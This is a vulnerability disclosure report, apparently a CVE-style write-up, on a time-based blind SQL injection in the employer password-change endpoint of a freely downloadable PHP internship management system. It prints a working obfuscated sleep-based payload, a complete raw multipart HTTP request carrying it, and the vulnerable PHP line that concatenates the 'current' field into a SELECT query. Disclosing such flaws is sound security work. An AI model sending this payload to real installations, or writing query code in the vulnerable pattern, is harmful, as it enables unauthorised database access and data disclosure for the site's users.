## Internship Portal file `employer/details/change_password.php` contains a Time-Based Blind SQL Injection vulnerability

Impact of the vulnerability

An authenticated employer user can inject SQL syntax into the `current` parameter on the password change endpoint. Because the application concatenates untrusted input directly into the SQL query used to verify the current password, an attacker can trigger database-side delays and confirm SQL injection through response timing. This may lead to:

- Database information disclosure through blind inference
- Authentication logic abuse
- Further compromise of account-related data

### Payload:

`Shar8850'and(select*from(select+sleep(10))a/**/union/**/select+1)='`

```text
Shar8850'and(select*from(select+sleep(10))a/**/union/**/select+1)='
```

### POC:

The vulnerable endpoint is `POST /employer/myaccount.php?change_password`.
The injection point is the multipart form field `current`, which is used directly in the SQL statement inside `employer/details/change_password.php`:

```php
$current_password = $_POST['current'];
$sqlPass = "SELECT * FROM employer WHERE password = '$current_password' AND email = '$email'";
```

Send the following request:

```http
POST /employer/myaccount.php?change_password HTTP/1.1
Host: internship
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaMukpDDqEfNqt7xg
Cookie: PHPSESSID=qithgp1m1at8bieavidf4ddlnc

------WebKitFormBoundaryaMukpDDqEfNqt7xg
Content-Disposition: form-data; name="current"

Shar8850'and(select*from(select+sleep(10))a/**/union/**/select+1)='
------WebKitFormBoundaryaMukpDDqEfNqt7xg
Content-Disposition: form-data; name="new"

Shar8850
------WebKitFormBoundaryaMukpDDqEfNqt7xg
Content-Disposition: form-data; name="confirm"

Shar8850
------WebKitFormBoundaryaMukpDDqEfNqt7xg
Content-Disposition: form-data; name="update_password"


------WebKitFormBoundaryaMukpDDqEfNqt7xg--
```

Expected result:

The server response is delayed by about 10 seconds, indicating that the injected `sleep(10)` function was executed by the database. This confirms a time-based blind SQL injection vulnerability in the `current` parameter of the employer password change feature.

### Notes:

- This endpoint requires a valid logged-in employer session.
- The vulnerable source file is `employer/details/change_password.php`.
- The issue exists because user input is concatenated into SQL without prepared statements or parameter binding.



### Sources download:

```text
https://code-projects.org/internship-management-system-in-php-with-source-code/
```

[Internship Management System In PHP With Source Code - Source Code & Projects](https://code-projects.org/internship-management-system-in-php-with-source-code/)



![image-20260603215423755](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260603215423755.png)
